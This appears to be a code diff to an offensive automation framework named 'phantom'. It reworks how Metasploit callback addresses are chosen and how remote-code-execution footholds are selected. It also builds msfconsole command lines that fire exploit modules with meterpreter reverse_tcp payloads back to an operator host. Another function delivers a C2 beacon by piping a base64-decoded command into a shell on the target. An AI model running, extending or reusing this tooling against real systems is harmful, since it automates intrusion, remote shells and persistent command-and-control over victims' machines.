@@ -2698,9 +2698,12 @@ def _service_exploit_adapter(wm, slots):
     platform = _target_os(wm)
     pf = PayloadFactory()
     spec = pf.spec(platform=platform, arch="x64")
-    from phantom.utils import config as cfg
-    lhost = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
-    lport = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+    # The exploit handler has its OWN callback port. Reusing c2.port made
+    # the handler collide with the beacon listener, and c2.host=127.0.0.1
+    # made every remote exploit dial the operator's loopback.
+    from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
+    lhost = _msf_lhost()
+    lport = _msf_lport()
 
     module, svc = _best_fingerprinted_module(wm)
     if module is not None:
@@ -2861,6 +2864,39 @@ def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
                             "port": str(v.get("port") or "80"),
                             "endpoint": v.get("endpoint") or "/",
                             "evidence": v.get("evidence") or ""})
+    plans = []
+    for f in wm.find("exploit_plan"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if str(v.get("kind", "")).lower() != "rce":
+            continue
+        plans.append({
+            "channel": "msf", "port": str(v.get("port") or ""),
+            "msf_module": str(v.get("msf_module") or ""),
+            "cve": str(v.get("cve") or ""),
+        })
+
+    def _enrich_from_plan(cand):
+        """A confirmed foothold may borrow its module from a matching plan.
+
+        The PLAN is never allowed to create a foothold on its own; it only
+        supplies the module path when the foothold itself was already
+        verified by an MSF session or a local PoC.
+        """
+        if cand.get("channel") != "msf" or cand.get("msf_module"):
+            return cand
+        cve = str(cand.get("cve") or "").upper()
+        port = str(cand.get("port") or "")
+        for plan in plans:
+            if cve and str(plan.get("cve") or "").upper() == cve:
+                cand.update({k: v for k, v in plan.items() if v})
+                return cand
+            if port and port == str(plan.get("port") or ""):
+                cand.update({k: v for k, v in plan.items() if v})
+                return cand
+        if len(plans) == 1 and plans[0].get("msf_module"):
+            cand.update({k: v for k, v in plans[0].items() if v})
+        return cand
+
     for f in wm.find("rce_foothold"):
         v = f.value if isinstance(f.value, dict) else {}
         if v.get("key") == "web_upload" or v.get("vector") == "arbitrary-file-upload":
@@ -2871,27 +2907,20 @@ def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
                     "evidence": v.get("evidence") or ""}
         # A foothold verified by a local PoC (channel=poc) or by a real
         # Meterpreter/shell session (channel=msf) is a first-class delivery
-        # channel. Before this, only the ORIGINAL exploit_plan was read, so
-        # a confirmed RCE could never feed beacon_via_rce.
+        # channel. A plan only enriches it with the module path; a plan by
+        # itself is NOT command execution and must never reach this bridge.
         ch = str(v.get("channel") or "").strip().lower()
-        if ch in ("poc", "msf") and v.get("cve"):
+        if ch in ("poc", "msf"):
             cand = {"channel": ch, "port": str(v.get("port") or ""),
                     "cve": str(v.get("cve") or ""),
                     "msf_module": str(v.get("msf_module") or ""),
                     "evidence": v.get("evidence") or ""}
-            if ch == "msf" and not cand["msf_module"]:
-                # fall through to the exploit_plan entry below, which
-                # carries the module path
+            cand = _enrich_from_plan(cand)
+            if ch == "msf" and not cand.get("msf_module"):
                 continue
             return cand
-    for f in wm.find("exploit_plan"):
-        v = f.value if isinstance(f.value, dict) else {}
-        if str(v.get("kind", "")).lower() != "rce":
-            continue
-        if best is None:
-            best = (0.5, {"channel": "msf", "port": str(v.get("port") or ""),
-                          "msf_module": v.get("msf_module") or "",
-                          "cve": v.get("cve") or ""})
+    # Confirmed web anomalies beat a bare plan. The plan-only fallback was
+    # removed: a marker from `synthesize_command` is a plan, not an RCE.
     return best[1] if best else None
 
 
@@ -3005,10 +3034,15 @@ def _rce_foothold_adapter(wm, slots):
         port = cand.get("port") or ""
         if not module:
             raise ValueError("RCE plan without msf module")
+        from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
+        lhost = _msf_lhost()
+        lport = _msf_lport()
         rport = f"; set RPORT {port}" if port else ""
         return (f"msfconsole -q -x \"use {module}; set RHOSTS {target}"
                 f"{rport}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; "
-                "run; exit -y\" | tee /dev/stderr | grep -E "
+                f"set LHOST {lhost}; set LPORT {lport}; "
+                "set ExitOnSession false; run -j; sleep 20; exit -y\" "
+                f"| tee /dev/stderr | grep -E "
                 f"'session \\d+ opened|Meterpreter session' "
                 f"&& echo RCE:channel=msf marker={marker}")
     raise ValueError(f"unsupported RCE channel: {cand['channel']}")
@@ -3179,14 +3213,11 @@ def _msf_beacon_delivery(wm, cand, beacon_cmd):
     payload = ("windows/x64/meterpreter/reverse_tcp"
                if "windows" in os_name
                else "linux/x64/meterpreter/reverse_tcp")
-    from phantom.utils import config as cfg
-    lhost = str(cfg.get("exploit.lhost", "",
-                        env="PHANTOM_EXPLOIT_LHOST")
-                or cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
+    from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
+    lhost = _msf_lhost()
     # LPORT is the Metasploit handler, NOT the C2 listener: reusing
     # c2.port made the handler fail to bind (the beacon listener owns it).
-    lport = cfg.get_int("exploit.lport", 4444,
-                        env="PHANTOM_EXPLOIT_LPORT")
+    lport = _msf_lport()
     b64 = base64.b64encode(beacon_cmd.encode()).decode()
     exec_cmd = f"echo {b64} | base64 -d | sh"
     rport = f"; set RPORT {port}" if port else ""
